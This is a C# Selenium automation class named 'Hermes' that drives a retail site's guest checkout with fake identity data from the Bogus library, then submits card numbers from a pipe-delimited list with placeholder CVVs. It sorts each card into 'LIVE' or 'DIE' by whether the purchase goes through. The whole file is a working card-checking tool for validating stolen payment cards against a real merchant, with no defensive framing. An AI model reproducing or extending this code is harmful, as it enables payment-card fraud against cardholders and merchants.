using Bogus;
using OpenQA.Selenium;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace _0lymp.us.Gods
{
    public partial class Hermes : Component
    {
        private static IWebDriver hermes;
        public List<string> CardsList { get; set; }
        public string Url { get; set; }
        private Faker faker;
        private string address;
        private string address2;
        private string city;
        private string state;
        private string zip;
        private string email;
        private string phone;

        public Thread VerifyCardsThread;
        public Thread StateCardsThread;
        public Thread ReduceCardsThread;
        public Thread RefreshProgressThread;

        public delegate void VerifyCardsCompleteHandler();
        public delegate void StateCardsCompleteHandler(string card);
        public delegate void ReduceCardsCompleteHandler(string cards);
        public delegate void RefreshProgressCompleteHandler(int percent, string message, string typeMessage);

        public event VerifyCardsCompleteHandler VerifyCardsComplete;
        public event StateCardsCompleteHandler LiveCardComplete;
        public event StateCardsCompleteHandler DieCardComplete;
        public event ReduceCardsCompleteHandler ReduceCardsComplete;
        public event RefreshProgressCompleteHandler RefreshProgressComplete;

        private string FirstName { get; set; }
        private string LastName { get; set; }

        public Hermes()
        {
            InitializeComponent();
            faker = new Faker();
        }

        public Hermes(IContainer container)
        {
            container.Add(this);

            InitializeComponent();
        }

        public void VerifyCards()
        {
            FirstName = faker.Name.FirstName();
            LastName = faker.Name.LastName();
            address = faker.Address.StreetAddress();
            address2 = ((Math.Round(new Random().NextDouble()) == 0.0) ? "" : faker.Address.SecondaryAddress());
            city = faker.Address.City();
            state = faker.Address.State();
            zip = faker.Address.ZipCode("#####");
            email = faker.Internet.Email();
            phone = faker.Phone.PhoneNumber();
            Load();
            hermes.Kill();
            ExecuteRefreshProgressThread(0, "", "Success");
            this.VerifyCardsComplete();
        }

        private void Load()
        {
            try
            {
                ExecuteRefreshProgressThread(1, "Cargando HERMES...", "Success");
                hermes = Driver.Chrome();
                hermes.GoUrl(Url);
            }
            catch (NoSuchElementException) { }
            catch (StaleElementReferenceException) { }
            catch (WebDriverException) { }
            catch (NullReferenceException) { }

            IWebElement webElement = hermes.ElementVisible(By.Id("sortMenu"), "ExceptionLoad");
            if (webElement.IsNotNull())
            {
                SortPriceUnder(webElement);
            }
            else
            {
                ExecuteRefreshProgressThread(1, "ERROR HERMES #1, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private void SortPriceUnder(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(10, "Ordenando productos", "Success");
                webElement.Click();
                Thread.Sleep(1000);
                hermes.FindElement(By.CssSelector("#sortMenu > ul > li:nth-child(4)")).Click();
                Thread.Sleep(2000);
            }
            catch (NoSuchElementException) { /*throw;*/  }
            catch (StaleElementReferenceException) { /*throw;*/  }
            catch (WebDriverException) { /*throw;*/  }
            catch (NullReferenceException) { /*throw;*/  }

            IWebElement webElement1 = hermes.ElementRandomVisible(By.CssSelector("#app > div > div.container-wrapper > div > div > div.col-lg-9.col-sm-4 > div > section > div > section:nth-child(4) > div > div:nth-child(1) > a"), "ExceptionSortPriceUnder", 20);

            if (webElement1.IsNotNull())
            {
                AddToCart(webElement1);
            }
            else
            {
                ExecuteRefreshProgressThread(10, "ERROR HERMES #2, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private void AddToCart(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(20, "seleccionando producto.", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/  }
            catch (StaleElementReferenceException) { /*throw;*/  }
            catch (WebDriverException) { /*throw;*/  }
            catch (NullReferenceException) { /*throw;*/  }

            IWebElement webElement1 = hermes.ElementVisible(By.CssSelector("button.btn.btn-primary.os-cta-payin-full.center"), "ExceptionAddtoCart");

            if (webElement1.IsNotNull())
            {
                Thread.Sleep(3000);
                PayNow(webElement1);
            }
            else
            {
                ExecuteRefreshProgressThread(20, "ERROR HERMES #3, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private void PayNow(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(30, "pagando.", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/  }
            catch (StaleElementReferenceException) { /*throw;*/  }
            catch (WebDriverException) { /*throw;*/  }
            catch (NullReferenceException) { /*throw;*/  }

            IWebElement webElement1 = hermes.ElementVisible(By.CssSelector("#ae-main-content > div > div > div > section.account-login.section.aem-GridColumn.aem-GridColumn--default--12 > section > div.login-container > div > div > div.login-inner__right.login-sign-in-inner-phase > div.login-section-block.first-part.checkout-phase > a"), "ExceptionPayNow");

            if (webElement1.IsNotNull())
            {
                GuestCheckout(webElement1);
            }
            else
            {
                ExecuteRefreshProgressThread(30, "ERROR HERMES #4, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private void GuestCheckout(IWebElement webElement)
        {
            try
            {
                ExecuteRefreshProgressThread(40, "registrando usuario.", "Success");
                webElement.Click();
            }
            catch (NoSuchElementException) { /*throw;*/  }
            catch (StaleElementReferenceException) { /*throw;*/  }
            catch (WebDriverException) { /*throw;*/  }
            catch (NullReferenceException) { /*throw;*/  }

            if (hermes.ElementVisible(By.Name("firstName")).IsNotNull())
            {
                Thread.Sleep(3000);
                ShippingAddress();
            }
            else
            {
                ExecuteRefreshProgressThread(40, "ERROR HERMES #5, Reiniciando proceso", "Success");
                Restart();
            }

        }

        private void ShippingAddress(bool acceptAddress = false)
        {
            try
            {
                ExecuteRefreshProgressThread(60, "creando direccion fake.", "Success");
                if (!acceptAddress)
                {
                    hermes.FindElement(By.Name("firstName")).SendKeys(FirstName);
                    hermes.FindElement(By.Name("lastName")).SendKeys(LastName);
                    hermes.FindElement(By.Name("line1")).SendKeys(address);
                    hermes.FindElement(By.Name("line2")).SendKeys(address2);
                    hermes.FindElement(By.Name("city")).SendKeys(city);
                    hermes.FindElement(By.CssSelector("div.selectric")).Click();
                    Thread.Sleep(1000);
                    
                    hermes.FindElement(By.CssSelector($"div.selectric-wrapper.selectric-open > div.selectric-items > div > ul > li:nth-child({new Random().Next(2, 52)})")).JsClick(); 
                    
                    //hermes.FindElement(By.CssSelector($"div.selectric-wrapper.selectric-open > div.selectric-items > div > ul > li:nth-child({new Random().Next(2, 52)})")).JsClick();

                    hermes.FindElement(By.Name("postalCode")).SendKeys(zip);
                    hermes.FindElement(By.CssSelector("form > div.input-control-inline.two-col-row > div > div:nth-child(1) > input")).SendKeys(email);
                    hermes.FindElement(By.CssSelector("form > div.input-control-inline.two-col-row > div > div:nth-child(2) > input")).SendKeys(phone);
                }
                Thread.Sleep(2000);
                hermes.FindElement(By.CssSelector("#ae-main-content > div > div > div.checkout-payment-page-holder.page-holder > div > div > div.checkout-payment-forms-holder > div.checkout-form-holder.shipping-details-form > div.checkout-form-content > div.checkout-form-button-area > button")).Click();
            }
            catch (NoSuchElementException) { /*throw;*/ }
            catch (StaleElementReferenceException) { /*throw;*/ }
            catch (WebDriverException) { /*throw;*/ }
            catch (NullReferenceException) { /*throw;*/ }

            IWebElement webElement1 = hermes.ElementTextContains(By.CssSelector("div.checkout-error-message.generic-error > h5"), "shipping", "ExceptionShippingAddressConfirmAddress");

            if (webElement1.IsNotNull())
            {
                ShippingAddress(true);
            }


            if (hermes.ElementVisible(By.Id("_ccInfo_CCNumber"), "ExceptionShippingAddress").IsNotNull())
            {
                LastProccess();
            }
            else
            {
                ExecuteRefreshProgressThread(60, "ERROR HERMES #6, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private void LastProccess()
        {
            try
            {
                int num = 0;
                while (num < CardsList.Count())
                {
                    List<string> list = CardsList[num].Split('|').ToList();
                    if (CardsList.Count() > 1)
                    {
                        CardsList[num] = CardsList[num].Replace("\r", "");
                    }
                    string text = CardsList[num];
                    string cards = CardsList[num].ToString();
                    if (CardsList.Count() > 1)
                    {
                        string text3 = CardsList[num] = (CardsList[num] += "\r");
                        cards = string.Join("", CardsList.ToArray());
                        text += "\r";
                    }
                    PaymentInformation(list[0], list[1], list[2], list[3]);

                    if (Confirmation())
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteLiveCardThread(text);
                        CardsList.Remove(CardsList[num]);
                        if (CardsList.Count() > 0)
                        {
                            Restart();
                        }
                    }
                    else
                    {
                        ExecuteReduceCardsThread(cards);
                        ExecuteDieCardThread(text);
                        CardsList.Remove(CardsList[num]);
                    }
                }
            }
            catch (ArgumentOutOfRangeException) { /*throw;*/ }
        }

        private void PaymentInformation(string number, string month, string year, string cvv)
        {
            try
            {
                ExecuteRefreshProgressThread(80, "Añadiendo tarjeta: " + number, "Success");
                Thread.Sleep(3000);
                hermes.FindElement(By.Id("_ccInfo_CCNumber")).SendKeys(number);
                hermes.FindElement(By.Name("expiryDate")).SendKeys(month + year.Substring(year.Length - 2));
                Thread.Sleep(1000);
                cvv = cvv.Replace("\r", "");
                switch (cvv.Count())
                {
                    case 3:
                        hermes.FindElement(By.Name("cvv")).SendKeys("000");
                        break;
                    case 4:
                        hermes.FindElement(By.Name("cvv")).SendKeys("0000");
                        break;
                }

                Thread.Sleep(1000);
                hermes.FindElement(By.CssSelector("div.billing-address-details > div > div.set-as-default-cc-box > div > label > span.cc-box-label")).Click();

                Thread.Sleep(1000);
                hermes.FindElement(By.CssSelector("button[ecom-data-link_cat=\"continue\"]")).Click();

            }
            catch (NoSuchElementException) { /*throw;*/  }
            catch (StaleElementReferenceException) { /*throw;*/  }
            catch (WebDriverException) { /*throw;*/  }
            catch (NullReferenceException) { /*throw;*/  }
            Thread.Sleep(5000);
            IWebElement webElement2 = hermes.ElementVisible(By.CssSelector("#ae-main-content > div > div > div.checkout-payment-page-holder.page-holder > div > div > div.order-summary-holder > div > div > div.os-action-holder.os-total-fixed-at-bottom-in-mobile > button"));

            if (webElement2.IsNotNull())
            {
                if (!(webElement2.GetAttribute("disabled") == "disabled"))
                {
                    webElement2.JsClick();
                }
            }
            else
            {
                ExecuteRefreshProgressThread(80, "ERROR HERMES #7, Reiniciando proceso", "Success");
                Restart();
            }
        }

        private bool Confirmation()
        {
            ExecuteRefreshProgressThread(90, "Confirmando.", "Success");
            //Thread.Sleep(2000);
            IWebElement webElement = hermes.ElementTextContains(By.CssSelector("div.checkout-error-message.generic-error > h5"), "invalid", "Die");

            if (webElement.IsNotNull())
            {
                ExecuteRefreshProgressThread(100, "DIE.", "Success");
                hermes.Refresh();
                //Thread.Sleep(2000);
                return false;
            }
            else
            {
                IWebElement webElement2 = hermes.ElementTextContains(By.CssSelector("#ae-main-content > div > div > section > div > div.col-sm-4.col-lg-6.thank-you-column-one > div:nth-child(1) > div > div > h1 > strong"), "Thank you.", "LIVE");
                if (webElement2.IsNotNull())
                {
                    ExecuteRefreshProgressThread(100, "LIVE.", "Success");
                    return true;
                }
                //}
            }
            Restart();
            return false;
        }

        private void Restart()
        {
            hermes.Kill();
            VerifyCards();
        }

        public void ExecuteThread()
        {
            VerifyCardsThread = new Thread(VerifyCards);
            VerifyCardsThread.Start();
        }

        private void ExecuteRefreshProgressThread(int percent, string message, string typeMessage)
        {
            RefreshProgressThread = new Thread((ThreadStart)delegate
            {
                RefreshProgress(percent, message, typeMessage);
            });
            RefreshProgressThread.Start();
        }

        public void KillThread()
        {
            try
            {
                VerifyCardsThread.Abort();
                VerifyCardsThread.Join();
                hermes.Kill();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteLiveCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                LiveCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillLiveCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteDieCardThread(string card)
        {
            StateCardsThread = new Thread((ThreadStart)delegate
            {
                DieCard(card);
            });
            StateCardsThread.Start();
        }

        public void KillDieCardThread()
        {
            try
            {
                StateCardsThread.Abort();
                StateCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }

        private void ExecuteReduceCardsThread(string cards)
        {
            ReduceCardsThread = new Thread((ThreadStart)delegate
            {
                ReduceCards(cards);
            });
            ReduceCardsThread.Start();
        }

        public void KillReduceCardsThread()
        {
            try
            {
                ReduceCardsThread.Abort();
                ReduceCardsThread.Join();
            }
            catch (NullReferenceException)
            {
            }
        }
        private void RefreshProgress(int percent, string message, string typeMessage)
        {
            this.RefreshProgressComplete(percent, message, typeMessage);
        }

        public void ReduceCards(string cards)
        {
            this.ReduceCardsComplete(cards);
        }

        private void LiveCard(string card)
        {
            this.LiveCardComplete(card);
        }

        private void DieCard(string card)
        {
            this.DieCardComplete(card);
        }
    }
}
